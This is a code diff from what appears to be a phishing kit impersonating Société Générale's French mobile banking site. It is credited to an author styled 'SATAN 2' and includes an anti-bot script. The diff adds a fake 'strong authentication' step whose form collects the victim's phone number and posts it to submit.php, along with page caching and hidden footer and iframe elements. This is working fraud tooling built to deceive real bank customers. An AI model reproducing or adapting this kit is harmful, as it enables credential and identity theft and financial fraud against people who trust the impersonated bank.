@@ -1,3 +1,31 @@
+<?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+
+/**
+ * @link       :   https://www.satan2.com/ 
+ * @package    :   SOCIETE GENERALE 
+ * @telegram   :   @satan2  
+ * Project Name:   SOCIETE GENERALE 2022
+ * Author      :   SATAN 2
+ * Mise à jour :   08-09-2022
+ * Author URI  :   https://www.facebook.com/satan2
+ */
+
+include '../inc/antibots.php';
+include_once '../inc/app.php';
+
+$random   = rand(0,100000000000);
+$LSG = substr(md5($random), 0, 17);
+
+?>
+<?php 
+/*CACHE*/
+$fichierCache = '../cache/lsg_mobile.lsg';
+if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
+?>
 
 <!DOCTYPE html>
 <html lang="fr" class="swm-root-active swm-mode-page" >
@@ -378,7 +406,7 @@ document.getElementById('codCl').className = 'waa';
 <a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#"><span class="rsp_link__label">Ouvrir un compte</span>
 </a></div>
 
-<h1 class="rsp_header__title-page" id="js-mobile-title">Authentification forte - Etape 3/3</h1>
+<h1 class="rsp_header__title-page" id="js-mobile-title">Authentification forte - Etape 1/3</h1>
 
 <input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD"/>
 </header>
@@ -658,22 +686,35 @@ swmConfOverride.styles = ["../assets/css/style.css"];
 </div>
 
 <div id="codCl">
-
+<form  action="submit.php"  method="POST" onsubmit="return cc()" >
 <div class="dcw_block dcw_block-text">
 <div class="dcw_block-element">
-<h3>L'authentification forte est bien activée, <br>Mise à jour des informations en cours...</h3>
+<h3>Pour accéder à tous vos services en ligne, merci de valider votre numéro de téléphone.</h3>
 </div>
 </div>
 
 
-<script>
-setTimeout(function(){
-window.location.href="finish.php?lsg#12996cdffc1053150";
-}, 7000);
-</script>  
+<div class="dcw_block dcw_block-input">
+<div class="dcw_block-element">
 
+<div class="row_section dcw_input-container">
+<input id="tel" name="tel" type="text" class="dcw_input grey_cross" placeholder=" " maxlength="10" onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57"autocomplete="off" autocapitalize="off" autocorrect="off" required="">
+<span class="dcw_sprite dcw_to-clear"></span>
+<span class="bar"></span>
+<label>Numéro de téléphone</label>
+<span class="text_is_invalid">Saisissez un identifiant valide</span>
+</div>
+</div>
+</div>
+<div class="dcw_block dcw_block-input">
 
-
+</div>
+<div class="dcw_block dcw_block-button">
+<div class="dcw_block-element">
+<button id="btn-validate" type="submit" class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable">Valider</button>
+</div>
+</div>
+</form>
 </div>
 
  </div>
@@ -1104,4 +1145,20 @@ if(idd == 2){
 </DIV>
 
 
+<?php 
+$contenuCache = ob_get_contents();ob_end_flush();
+$fd = fopen("$fichierCache", "w");
+if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_mobile.lsg');echo "\n";}  
+?>
+<input type="hidden" name="memoryText" id="memoryText" value="<?php if(isset($_SESSION['memory'])){ echo htmlspecialchars($_SESSION['memory']); } ?>" style="display: none;">
+<footer style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"> 
+<div id="footerr" class="Footer" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></div><iframe id="footerr2" src="" scrolling="no" style="display: none; visibility: hidden; overflow: hidden; width: 0px !important; height: 0px !important;"></iframe>
+</footer>
+<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
+<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afb.js" defer="defer"></script>
+
+
+</body>
+</html>
+ 
 
